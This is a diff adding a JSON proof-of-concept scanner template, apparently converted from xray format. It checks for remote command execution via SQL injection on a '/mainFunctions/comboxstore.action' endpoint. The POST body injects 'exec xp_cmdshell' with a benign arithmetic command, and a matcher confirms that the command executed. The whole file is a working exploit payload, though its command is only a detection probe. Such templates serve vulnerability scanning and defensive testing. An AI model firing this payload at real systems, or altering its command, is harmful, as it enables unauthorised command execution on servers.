@@ -1,0 +1,70 @@
+{
+  "name": "poc-yaml-test-rce",
+  "author": "k3ppf0r",
+  "description": "",
+  "version": "",
+  "protocol": "http",
+  "selfContained": false,
+  "flow": "r0()",
+  "searchQueries": {},
+  "variables": {
+    "s1": [
+      "randomInt(100000, 200000)"
+    ],
+    "s2": [
+      "randomInt(10000, 20000)"
+    ]
+  },
+  "variablesType": "sniper",
+  "verifySteps": [
+    {
+      "stepId": "r0",
+      "method": "POST",
+      "path": "/mainFunctions/comboxstore.action",
+      "headers": {
+        "Content-Type": "application/x-www-form-urlencoded"
+      },
+      "body": "comboxsql\u003dexec%20xp_cmdshell%20\u0027set /A {{s2}}-{{s1}}\u0027\n",
+      "followRedirect": false,
+      "timeout": 0,
+      "readSize": 0,
+      "unsafe": false,
+      "disableCookie": false,
+      "disablePathAutomerge": false,
+      "cache": true,
+      "compressed": false,
+      "chunked": false,
+      "matchers": [
+        {
+          "type": "DSL",
+          "values": [
+            "response.status \u003d\u003d 200 \u0026\u0026 response.body_string.contains(string(s2 - s1)) \u0026\u0026 response.body_string.contains(\"Value\")"
+          ],
+          "negative": false,
+          "condition": "AND",
+          "index": 0,
+          "caseInsensitive": false,
+          "greedy": false,
+          "group": 0
+        }
+      ],
+      "matchersCondition": "AND",
+      "extractors": [],
+      "output": {},
+      "retries": 0,
+      "retryInterval": 0
+    }
+  ],
+  "exploitSteps": [],
+  "globalConfig": {
+    "maxRetries": 0,
+    "retryInterval": 0,
+    "globalHeaders": {},
+    "stopAtFirstMatch": false,
+    "threads": 0,
+    "cookieReuse": false,
+    "dnsConfig": {},
+    "authConfig": {}
+  },
+  "originalFormat": "xray"
+}
